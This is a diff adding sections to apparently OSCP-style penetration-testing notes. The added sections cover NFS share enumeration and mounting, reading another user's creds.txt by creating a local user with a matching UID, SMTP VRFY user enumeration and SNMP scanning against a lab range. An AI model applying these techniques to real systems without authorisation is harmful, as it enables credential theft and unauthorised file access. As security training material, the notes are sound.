@@ -533,3 +533,77 @@ Also use the more specific tool to get info about NetBIOS: `nbtscan`:
 sudo nbtscan -r 10.11.1.0/24
 ```
 
+##### Network File System (NFS)
+NFS is a distributed file system protocol originally developed by Sun Microsystems in 1984. It allows a user on a client computer to access files over a computer network as if they were on locally-mounted storage. It's quite difficult to set it up securely so it's common it has vulnerabilities.
+
+Both **Portmapper** and **RPCbind** run on TCP port 111. Requests to NFS goes through these services so it's a good idea to scan for them first:
+```
+nmap -v -p 111 10.11.1.1-254
+```
+
+We can also use the rpcinfo nse script to scan for what rpc services are running on a system and on what port they run.
+```
+nmap -sV -p 111 --script=rpcinfo 10.11.1.1-254
+```
+
+We can also run all the NFS scripts using a wildcard:
+```
+kali@kali:~$ nmap -p 111 --script nfs* 10.11.1.72 ...
+Nmap scan report for 10.11.1.72
+PORT STATE SERVICE
+111/tcp open rpcbind
+| nfs-showmount:
+|_ /home 10.11.0.0/255.255.0.0
+```
+
+As the whole /home directory is shared, it is possible to mount it from our computer:
+```
+sudo mount -o nolock 10.11.1.72:/home ~/home/
+```
+The `-o nolock` (disabling file locking) is generally needed for older nfs servers.
+
+It may happen that certain files are just allowed to be accessed by a certain user/group, and these permisions are kept when mounting the remote folder. In the next log it's clear that the file `creds.txt`
+```
+kali@kali:~/home$ cd marcus
+kali@kali:~/home/marcus$ ls -la
+total 24
+drwxr-xr-x 2 1014 1014 4096 Jun 10 09:16 .
+drwxr-xr-x 7 root root 4096 Sep 17 2015 ..
+-rwx------ 1 1014 1014 48 Jun 10 09:16 creds.txt
+kali@kali:~/home/marcus$ cat creds.txt cat: creds.txt: Permission denied
+```
+
+We can then create a user with that id on our computer et voila:
+```
+sudo adduser pwn
+```
+If the new user has id 1001, we change it to 1014 in /etc/password:
+```
+sudo sed -i -e 's/1001/1014/g' /etc/passwd
+```
+
+##### SMTP enumeration
+The Simple Mail Transport Protocol supports several interesting commands, such as VRFY and EXPN. A VRFY request asks the server to verify an email address, while EXPN asks the server for the membership of a mailing list.
+
+```
+kali@kali:~$ nc -nv 10.11.1.217 25
+(UNKNOWN) [10.11.1.217] 25 (smtp) open
+220 hotline.localdomain ESMTP Postfix
+VRFY root
+252 2.0.0 root
+VRFY idontexist
+550 5.1.1 <idontexist>: Recipient address rejected: User unknown in local recipient table
+```
+
+##### SNMP enumeration
+Over the years, we have often found that the Simple Network Management Protocol (SNMP) is not well-understood by many network administrators. This often results in SNMP misconfigurations, which can result in significant information leakage.
+
+It is based on UDP which is stateless and therefore is susceptible to IP spoofing and replay attacks. SNMP protocols 1, 2, and 2c offer no traffic encryption.
+
+###### The SNMP MIB Tree
+The SNMP Management Information Base (MIB) is a database containing information usually related to network management. It has OIDs of resources that can be monitored.
+
+Scan for SNMP:
+```
+sudo nmap -sU --open -p 161 10.11.1.1-254
+```
